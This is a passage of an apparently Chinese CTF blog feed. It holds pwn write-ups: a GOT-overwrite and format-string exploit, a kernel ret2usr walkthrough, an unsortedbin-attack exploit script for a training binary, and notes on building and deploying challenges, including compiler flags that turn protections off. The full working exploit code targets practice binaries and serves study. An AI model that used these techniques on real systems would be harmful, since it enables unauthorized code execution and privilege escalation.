class="string">"hello"</span>)</span><br><span class="line">realloc(<span class="number">0</span>,<span class="number">0</span>)<span class="comment">#free了，但没有置零</span></span><br><span class="line">realloc(<span class="number">0</span>,<span class="number">8</span>,p64(elf.got[<span class="string">'atoll'</span>]))<span class="comment">#对free的块直接修改</span></span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">8</span>,<span class="string">'n0va'</span>)<span class="comment">#将上面的块申请回来</span></span><br><span class="line">realloc(<span class="number">1</span>,<span class="number">0x20</span>,<span class="string">'aaa'</span>)<span class="comment">#修改大小为0x31</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">realloc(<span class="number">0</span>,<span class="number">0x20</span>,p64(elf.got[<span class="string">'atoll'</span>]))<span class="comment">#chunk0和chunk1内存中指向一个chunk,0的头没有置零，realloc正常。</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x20</span>,<span class="string">'bbb'</span>)<span class="comment">#1申请回来0x31</span></span><br><span class="line">realloc(<span class="number">0</span>,<span class="number">0x30</span>,<span class="string">'bbb'</span>)<span class="comment">#realloc变0x41</span></span><br><span class="line">free(<span class="number">0</span>)<span class="comment">#0free了,头被置零了,0x41进入tcache</span></span><br><span class="line">realloc(<span class="number">1</span>,<span class="number">0x40</span>,<span class="string">'ccc'</span>)<span class="comment">#将1的大小realloc为0x51进入</span></span><br><span class="line">free(<span class="number">1</span>)<span class="comment">#1也free了，0x51进入tcache</span></span><br><span class="line"><span class="comment">#0x20 [  0]: 0x404048 (atoll@got.plt) ◂— ...</span></span><br><span class="line"><span class="comment">#0x30 [  0]: 0x404048 (atoll@got.plt) ◂— ...</span></span><br><span class="line"><span class="comment">#0x40 [  1]: 0x1db4260 ◂— 0x0</span></span><br><span class="line"><span class="comment">#0x50 [  1]: 0x1db4260 ◂— 0x0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x18</span>,p64(elf.plt[<span class="string">'printf'</span>]))<span class="comment">#修改atollgot表为printf plt</span></span><br><span class="line"><span class="comment"># leak address</span></span><br><span class="line">choice(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,"b *0x40129D")</span></span><br><span class="line">sla(<span class="string">"Index:"</span>,<span class="string">"%3$p"</span>)<span class="comment">#泄漏信息</span></span><br><span class="line">read_chk = int(ru(<span class="string">'\n'</span>).strip(<span class="string">'\n'</span>),<span class="number">16</span>) - <span class="number">9</span></span><br><span class="line">libc_base = read_chk - libc.symbols[<span class="string">'__read_chk'</span>]</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">show(<span class="string">"libc_base: "</span>,libc_base)</span><br><span class="line">show(<span class="string">"system: "</span>,system)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># change atoll to system </span></span><br><span class="line">choice(<span class="number">1</span>)</span><br><span class="line">sda(<span class="string">"Index:"</span>,<span class="string">'a'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,"b *0x40129D")</span></span><br><span class="line">sda(<span class="string">"Size:"</span>,<span class="string">'%32c'</span>)</span><br><span class="line">sda(<span class="string">"Data:"</span>,p64(system))</span><br><span class="line"></span><br><span class="line"><span class="comment"># get shell</span></span><br><span class="line">choice(<span class="number">1</span>)</span><br><span class="line">sda(<span class="string">"Index:"</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>参考：<a href="https://www.freebuf.com/news/162929.html" target="_blank" rel="noopener">Pwnable.tw刷题之Silverbullet破解过程分享</a></p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwnable.tw</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn出题环境搭建</title>
    <url>/2020/11/07/16-20/</url>
    <content><![CDATA[<blockquote>
<p>周六有个校赛，要出题目和搭建环境，记录下一些有用的东西</p>
</blockquote>
<p>GCC编译中几种保护打开和关闭的参数：<a href="https://blog.csdn.net/lonyliu/article/details/90341012" target="_blank" rel="noopener">https://blog.csdn.net/lonyliu/article/details/90341012</a></p>
<ul>
<li>NX：<code>-z execstack</code> / <code>-z noexecstack</code> (关闭 / 开启)  不让执行栈上的数据，于是JMP ESP就不能用了</li>
<li>Canary：<code>-fno-stack-protector</code> /<code>-fstack-protector</code> / <code>-fstack-protector-all</code> (关闭 / 开启 / 全开启) 栈里插入cookie信息</li>
<li>PIE：<code>-no-pie</code> / <code>-pie</code> (关闭 / 开启)  地址随机化，另外打开后会有<em>get_pc_thunk</em></li>
<li>RELRO：<code>-z norelro</code> / <code>-z lazy</code> / <code>-z now</code> (关闭 / 部分开启 / 完全开启) 对GOT表具有写权限</li>
</ul>
<p><code>gcc 文件名.c -o 文件 -z execstack -fno-stack-protector -no-pie -z norelro</code></p>
<p>如何安全快速地部署多道 ctf pwn 比赛题目：<a href="https://mp.weixin.qq.com/s?__biz=MjM5MTYxNjQxOA==&amp;mid=2652848854&amp;idx=1&amp;sn=ff537cc73e76e1ab058bd36cb76749a0&amp;chksm=bd593e1b8a2eb70d41627a1d04c1abec2c071f28c2649ddd9e313c4eda854ca4a26db20a1985&amp;mpshare=1&amp;scene=1&amp;srcid=1011dGXhepYahcla33btEWte#rd" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MjM5MTYxNjQxOA==&amp;mid=2652848854&amp;idx=1&amp;sn=ff537cc73e76e1ab058bd36cb76749a0&amp;chksm=bd593e1b8a2eb70d41627a1d04c1abec2c071f28c2649ddd9e313c4eda854ca4a26db20a1985&amp;mpshare=1&amp;scene=1&amp;srcid=1011dGXhepYahcla33btEWte#rd</a></p>
<h2 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -fsSL https:&#x2F;&#x2F;get.docker.com | bash -s docker --mirror Aliyun</span><br><span class="line">或者</span><br><span class="line">curl -sSL https:&#x2F;&#x2F;get.daocloud.io&#x2F;docker | sh</span><br></pre></td></tr></table></figure>
<h3 id="打包"><a href="#打包" class="headerlink" title="打包"></a>打包</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo docker save &lt;ImageID&gt; &gt; gzip xxx.tar.gz</span><br></pre></td></tr></table></figure>
<h3 id="查看镜像"><a href="#查看镜像" class="headerlink" title="查看镜像"></a>查看镜像</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo docker images</span><br></pre></td></tr></table></figure>
<h3 id="查看容器"><a href="#查看容器" class="headerlink" title="查看容器"></a>查看容器</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo docker ps -a</span><br></pre></td></tr></table></figure>
<h3 id="删除容器"><a href="#删除容器" class="headerlink" title="删除容器"></a>删除容器</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo docker rm &lt;containerID&gt;</span><br></pre></td></tr></table></figure>
<h3 id="删除镜像"><a href="#删除镜像" class="headerlink" title="删除镜像"></a>删除镜像</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo docker rmi &lt;imageID&gt;</span><br></pre></td></tr></table></figure>
<h3 id="暂停运行"><a href="#暂停运行" class="headerlink" title="暂停运行"></a>暂停运行</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo docker stop &lt;containerID&gt;</span><br></pre></td></tr></table></figure>
<h3 id="安装ssh服务"><a href="#安装ssh服务" class="headerlink" title="安装ssh服务"></a>安装ssh服务</h3><blockquote>
<p><a href="https://blog.csdn.net/weixin_30701521/article/details/101810109" target="_blank" rel="noopener">https://blog.csdn.net/weixin_30701521/article/details/101810109</a></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install openssh-client</span><br><span class="line">apt-get install openssh-server</span><br><span class="line">&#x2F;etc&#x2F;init.d&#x2F;ssh start</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>出题环境</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn wp模板</title>
    <url>/2021/05/13/20-51/</url>
    <content><![CDATA[<h2 id="栈题"><a href="#栈题" class="headerlink" title="栈题"></a>栈题</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">file = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">local=<span class="number">0</span></span><br><span class="line"><span class="comment">#local libc</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">  p = process(<span class="string">"./"</span>+file)</span><br><span class="line">  elf = ELF(<span class="string">"./"</span>+file)</span><br><span class="line">  libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc-2.23.so"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug libc</span></span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">1</span>:</span><br><span class="line">  p = process([<span class="string">"/usr/local/glibc-2.23/lib/ld-2.23.so"</span>, <span class="string">"./"</span>+file],</span><br><span class="line">            env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"/usr/local/glibc-2.23/lib/libc-2.23.so"</span>&#125;)</span><br><span class="line">  elf = ELF(<span class="string">"./"</span>+file)</span><br><span class="line">  libc = ELF(<span class="string">"/usr/local/glibc-2.23/lib/libc-2.23.so"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#remote</span></span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">2</span>:</span><br><span class="line">  p = remote()</span><br><span class="line">  elf = ELF(<span class="string">"./"</span>+file)</span><br><span class="line">  libc = ELF(<span class="string">"./libc-2.23.so"</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil()</span><br><span class="line">p.sendline()</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="堆题"><a href="#堆题" class="headerlink" title="堆题"></a>堆题</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">file = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">local=<span class="number">0</span></span><br><span class="line"><span class="comment">#local libc</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">  p = process(<span class="string">"./"</span>+file)</span><br><span class="line">  elf = ELF(<span class="string">"./"</span>+file)</span><br><span class="line">  libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc-2.23.so"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug libc</span></span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">1</span>:</span><br><span class="line">  p = process([<span class="string">"/usr/local/glibc-2.23/lib/ld-2.23.so"</span>, <span class="string">"./"</span>+file],</span><br><span class="line">            env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"/usr/local/glibc-2.23/lib/libc-2.23.so"</span>&#125;)</span><br><span class="line">  elf = ELF(<span class="string">"./"</span>+file)</span><br><span class="line">  libc = ELF(<span class="string">"/usr/local/glibc-2.23/lib/libc-2.23.so"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#remote</span></span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">2</span>:</span><br><span class="line">  p = remote()</span><br><span class="line">  elf = ELF(<span class="string">"./"</span>+file)</span><br><span class="line">  libc = ELF(<span class="string">"./libc-2.23.so"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(choice)</span>:</span></span><br><span class="line">    p.recvuntil()</span><br><span class="line">    p.sendline(str(choice))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">()</span>:</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil()</span><br><span class="line">    p.sendline()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">()</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">()</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">    </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>ret2usr</title>
    <url>/2020/10/22/00-32/</url>
    <content><![CDATA[<p>适合人群：内核基础为0</p>
<h2 id="知识学习"><a href="#知识学习" class="headerlink" title="知识学习"></a>知识学习</h2><p>基础知识：</p>
<p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/basic_knowledge-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/basic_knowledge-zh/</a></p>
<p><a href="https://xz.aliyun.com/t/7625#toc-10" target="_blank" rel="noopener">https://xz.aliyun.com/t/7625#toc-10</a></p>
<h4 id="copy-from-user"><a href="#copy-from-user" class="headerlink" title="copy_from_user"></a>copy_from_user</h4><p>copy_from_user(void <em>to, const void __user </em>from, unsigned long n)</p>
<p>（1）to：将数据拷贝到<strong>内核地址</strong> </p>
<p>（2）from：需要拷贝数据的<strong>用户地址</strong></p>
<p>（3）n：拷贝数据的长度（字节）</p>
<blockquote>
<p>也就是将form用户地址中的数据拷贝到to内核地址中去，拷贝长度是n</p>
</blockquote>
<h4 id="cpio解压和打包"><a href="#cpio解压和打包" class="headerlink" title="cpio解压和打包"></a>cpio解压和打包</h4><p>解压：cpio -idvm &lt; ../initramfs.cpio<br>打包：find . | cpio -H newc -o &gt; ../initramfs.cpio</p>
<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>调试，<code>startvm.sh</code>末尾加上</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-gdb tcp::1234 -S</span><br></pre></td></tr></table></figure>
<p>【注：上一行后面还要加上’ \ ‘，不然的话，远程调试可能端口没开，连不上】</p>
<p><img src="/2020/10/22/00-32/image-20200903111140398.png" alt="image-20200903111140398"></p>
<h2 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h2><h4 id="ret2usr（level1）"><a href="#ret2usr（level1）" class="headerlink" title="ret2usr（level1）"></a>ret2usr（level1）</h4><p>说明：参考<code>Linux Kernel Pwn 初探</code>,主要加上具体的一些细节</p>
<h5 id="查找prepare-kernel-cred和commit-creds的地址"><a href="#查找prepare-kernel-cred和commit-creds的地址" class="headerlink" title="查找prepare_kernel_cred和commit_creds的地址"></a>查找prepare_kernel_cred和commit_creds的地址</h5><pre><code> $ grep prepare_kernel_cred  /proc/kallsyms 
 $ grep commit_creds  /proc/kallsyms 
</code></pre><p><img src="/2020/10/22/00-32/image-20200903105056015.png" alt="image-20200903105056015"></p>
<p>但是直接执行，地址都是0x0，需要root权限。</p>
<p><img src="/2020/10/22/00-32/image-20200903105223481.png" alt="image-20200903105223481"></p>
<p>方法：修改suid</p>
<p>（1）创建一个文件夹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ mkdir myimage</span><br><span class="line">$ cd myimage</span><br></pre></td></tr></table></figure>
<p>（2）解压initramfs.cpio文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cpio -idvm &lt; ..&#x2F;initramfs.cpio</span><br></pre></td></tr></table></figure>
<p>（3）修改suid</p>
<p>进入etc/init.d/rcS，将1000修改为0</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">level1&#x2F;myimage$ gedit etc&#x2F;init.d&#x2F;rcS</span><br></pre></td></tr></table></figure>
<p><img src="/2020/10/22/00-32/image-20200903110009863.png" alt="image-20200903110009863"></p>
<p>（4）重新打包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">level1&#x2F;myimage$ find . | cpio -H newc -o &gt; ..&#x2F;initramfs.cpio</span><br><span class="line">level1&#x2F;myimage$ cd ..</span><br></pre></td></tr></table></figure>
<p>（5）再次执行两条命令即可</p>
<p><img src="/2020/10/22/00-32/image-20200903110203208.png" alt="image-20200903110203208"></p>
<p>已经是root权限了</p>
<p><img src="/2020/10/22/00-32/image-20200903110251793.png" alt="image-20200903110251793"></p>
<p><code>prepare_kernel_cred</code>的地址为<code>0xffffffff810b9d80</code></p>
<p><code>commit_creds</code>的地址为<code>0xffffffff810b99d0</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F; # grep prepare_kernel_cred  &#x2F;proc&#x2F;kallsyms </span><br><span class="line">ffffffff8109a620 T prepare_kernel_cred</span><br><span class="line">ffffffff81b72650 R __ksymtab_prepare_kernel_cred</span><br><span class="line">ffffffff81b89b07 r __kstrtab_prepare_kernel_cred</span><br><span class="line">&#x2F; # grep commit_creds  &#x2F;proc&#x2F;kallsyms </span><br><span class="line">ffffffff8109a250 T commit_creds</span><br><span class="line">ffffffff81b69b00 R __ksymtab_commit_creds</span><br><span class="line">ffffffff81b89b43 r __kstrtab_commit_creds</span><br><span class="line">&#x2F; # cat &#x2F;proc&#x2F;modules </span><br><span class="line">rootme 1616 0 - Live 0xffffffffc0000000 (OE)</span><br><span class="line">.&#x2F;sys&#x2F;module&#x2F;rootme</span><br><span class="line">.&#x2F;proc&#x2F;rootme</span><br></pre></td></tr></table></figure>
<blockquote>
<p>疑问解答：此时已经获得root权限了，不就可以直接cat /flag了？</p>
<p>实际题目中，不会把真的flag放文件里给你，而是在远程环境了。但是本地的地址和远程的地址是一样的，所以，可以通过这种方法得到本地的用户权限，找到prepare_kernel_cred和commit_creds的地址，但是没有办法直接获得flag。</p>
</blockquote>
<h5 id="查找基地址"><a href="#查找基地址" class="headerlink" title="查找基地址"></a>查找基地址</h5><p>以root权限运行，参考上面（修改etc/init.d/rcS）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;home&#x2F;pwn # cat &#x2F;proc&#x2F;modules </span><br><span class="line">baby 16384 0 - Live 0xffffffffc0002000 (POE)</span><br></pre></td></tr></table></figure>
<h5 id="调试内核"><a href="#调试内核" class="headerlink" title="调试内核"></a>调试内核</h5><p>（1）编辑startvm.sh，端口可以修改</p>
<p>0x7ffd958d7e08</p>
<p><img src="/2020/10/22/00-32/image-20200905004851358.png" alt="image-20200905004851358"></p>
<p>（2）执行<code>./startvm.sh</code></p>
<p>（3）打开新窗口，在<code>level1</code>目录下执行<code>gdb exp</code></p>
<p>（4）远程连接，<code>target remote :1234</code></p>
<p>（5）下断点（ida里面的地址+基地址），继续执行</p>
<p><img src="/2020/10/22/00-32/image-20200905103517562.png" alt="image-20200905103517562"></p>
<p><img src="/2020/10/22/00-32/image-20200905103116021.png" alt="image-20200905103116021"></p>
<p>（6）在原来的窗口，执行exp</p>
<p><img src="/2020/10/22/00-32/image-20200905103146690.png" alt="image-20200905103146690"></p>
<p>（7）接着，就可以正常调试了</p>
<h5 id="执行exp步骤"><a href="#执行exp步骤" class="headerlink" title="执行exp步骤"></a>执行exp步骤</h5><p>（1）编译exp.c</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ gcc exp.c -o exp -w -static -fPIC</span><br><span class="line">cd myimage&#x2F;</span><br></pre></td></tr></table></figure>
<p>（2）将initramfs.cpio解压到myimage文件夹</p>
<p>find . | cpio -H newc -o &gt; ../initramfs.cpio</p>
<p>（3）将exp移入myimage文件夹下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cp exp myimage&#x2F;</span><br></pre></td></tr></table></figure>
<p>（4）重新打包，执行./startvm.sh</p>
<p>exp已在/目录下了</p>
<p><img src="/2020/10/22/00-32/image-20200903111831663.png" alt="image-20200903111831663"></p>
<h5 id="疑惑的0x88和0x80"><a href="#疑惑的0x88和0x80" class="headerlink" title="疑惑的0x88和0x80"></a>疑惑的0x88和0x80</h5><p>一开始，说将<code>0x100</code>的用户数据拷贝到内核栈上，高度只有<code>0x88</code>，后面又说实际上缓冲区距离<code>rbp</code>是<code>0x80</code>，有点迷。</p>
<p>一开始的0x88，指的是初始化的时候。</p>
<p>但是程序初始化的时候，有个压栈操作，所以少减了一个8</p>
<p><img src="/2020/10/22/00-32/image-20200903112746033.png" alt="image-20200903112746033"></p>
<h5 id="程序执行流程"><a href="#程序执行流程" class="headerlink" title="程序执行流程"></a>程序执行流程</h5><p>init_module是内核加载模块的时候调用的</p>
<p>开始的时候（内核加载模块）：调用init_module</p>
<p>中间的时候：</p>
<p>我们调用ioctl调用了sub_0函数</p>
<p>ioctl的参数就是sub_0的参数</p>
<p><img src="/2020/10/22/00-32/image-20200905120014834.png" alt="image-20200905120014834"></p>
<p><code>return (signed int)copy_from_user(&amp;v4, v2, 256LL);</code></p>
<p>我们通过buf覆盖栈上的返回地址，执行v2中copy过去的templine函数，获得shell</p>
<p>结束的时候：cleanup_module</p>
]]></content>
      <categories>
        <category>advanced pwn</category>
      </categories>
      <tags>
        <tag>kernel pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>unsortedbin attack</title>
    <url>/2021/05/13/14-41/</url>
    <content><![CDATA[<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="针对类型"><a href="#针对类型" class="headerlink" title="针对类型"></a>针对类型</h2><p>需要修改任意地址位一个较大的值</p>
<ol>
<li>修改循环次数，执行多次循环</li>
<li>修改heap的global_max_fast（使得更大的chunk可以视为fastbin）</li>
</ol>
<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><p>可修改unsortedbin的bk指针</p>
<h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><h3 id="得到unsortbin方法"><a href="#得到unsortbin方法" class="headerlink" title="得到unsortbin方法"></a>得到unsortbin方法</h3><ol>
<li>一个大的chunk被分割 =&gt; 剩下的部分大于MINISIZE</li>
<li>释放一个不属于fastbin的chunk，该chunk不和top chunk相邻</li>
<li>进行malloc_consolidate，合并后的chunk放入unsortbin，且该chunk不和top chunk相邻</li>
</ol>
<h3 id="unosortbin链"><a href="#unosortbin链" class="headerlink" title="unosortbin链"></a>unosortbin链</h3><ol>
<li>采用FIFO的顺序</li>
<li>若fastbin和smallbin中没有对应大小块，则从unsortbin中取</li>
</ol>
<h3 id="main-arena-gt-libc-base"><a href="#main-arena-gt-libc-base" class="headerlink" title="main_arena =&gt; libc_base"></a>main_arena =&gt; libc_base</h3><p>因为main_arena和__malloc_hook只相差0x10，所以</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libc_base = main_arena - <span class="number">0x10</span> - libc.sym[<span class="string">'__malloc_hook'</span>]</span><br></pre></td></tr></table></figure>
<h3 id="unsortedbin-attack"><a href="#unsortedbin-attack" class="headerlink" title="unsortedbin attack"></a>unsortedbin attack</h3><blockquote>
<p>当将一个 unsorted bin 取出的时候，会将 <code>bck-&gt;fd</code> 的位置写入本 Unsorted Bin 的位置。</p>
</blockquote>
<h4 id="步骤-1"><a href="#步骤-1" class="headerlink" title="步骤"></a>步骤</h4><ol>
<li>将一个chunk放入unsortedbin中</li>
<li>修改该chunk的bk指针为target-0x10</li>
<li>申请该大小的chunk</li>
</ol>
<h4 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h4><p>修改target地址的值为&amp;main_arena+0x88</p>
<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><h2 id="hitcontraining-magicheap"><a href="#hitcontraining-magicheap" class="headerlink" title="hitcontraining_magicheap"></a>hitcontraining_magicheap</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><ol>
<li>存在后门函数，只要修改magic的大小&gt;0x1305即可，故使用unsortedbin</li>
<li>edit的size自己输入，存在堆溢出，故可以修改bk指针。</li>
</ol>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ol>
<li><p>申请三个块</p>
<p>chunk1是为了堆溢出修改第二个块的bk</p>
<p>chunk2主要进行unsortbin attack</p>
<p>chunk3防止和top chunk合并</p>
</li>
<li><p>释放chunk2</p>
<p>chunk申请大小0x100，大于fastbin大小，从而进入unsortbin链</p>
</li>
<li><p>堆溢出chunk1，修改chunk2的bk指针</p>
<p>修改位magic-0x10的位置</p>
</li>
<li><p>重新申请0x100的大小，从而将chunk2从unsortbin中取出，从而向bk指向的地址写入&amp;main_arena+0x88</p>
</li>
<li><p>进入后门函数</p>
</li>
</ol>
<h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">file = <span class="string">"magicheap"</span></span><br><span class="line"></span><br><span class="line">local=<span class="number">0</span></span><br><span class="line"><span class="comment">#local libc</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">  p = process(<span class="string">"./"</span>+file)</span><br><span class="line">  elf = ELF(<span class="string">"./"</span>+file)</span><br><span class="line">  libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc-2.23.so"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug libc</span></span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">1</span>:</span><br><span class="line">  p = process([<span class="string">"/usr/local/glibc-2.23/lib/ld-2.23.so"</span>, <span class="string">"./"</span>+file],</span><br><span class="line">            env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"/usr/local/glibc-2.23/lib/libc-2.23.so"</span>&#125;)</span><br><span class="line">  elf = ELF(<span class="string">"./file"</span>)</span><br><span class="line">  libc = ELF(<span class="string">"/usr/local/glibc-2.23/lib/libc-2.23.so"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#remote</span></span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">2</span>:</span><br><span class="line">  p = remote()</span><br><span class="line">  elf = ELF(<span class="string">"./"</span>+file)</span><br><span class="line">  libc = ELF(<span class="string">"./libc-2.23.so"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(choice)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">    p.sendline(str(choice))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Size of Heap : "</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">"Content of heap:"</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,size,content)</span>:</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Index :"</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">"Size of Heap :"</span>)</span><br><span class="line">    p.sendline(str(size)) </span><br><span class="line">    p.recvuntil(<span class="string">"Content of heap : "</span>)</span><br><span class="line">    p.sendline(content) </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Index :"</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x006020A0</span> - <span class="number">0x10</span></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x30</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0x111</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(magic)</span><br><span class="line">edit(<span class="number">0</span>,len(payload),payload)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'aaa'</span>)</span><br><span class="line"></span><br><span class="line">cmd(<span class="number">0x1305</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p><a href="magicheap">附件</a></p>
<h2 id="2016-0CTF-zerostorage"><a href="#2016-0CTF-zerostorage" class="headerlink" title="2016_0CTF_zerostorage"></a>2016_0CTF_zerostorage</h2>]]></content>
      <categories>
        <category>专题</category>
      </categories>
      <tags>
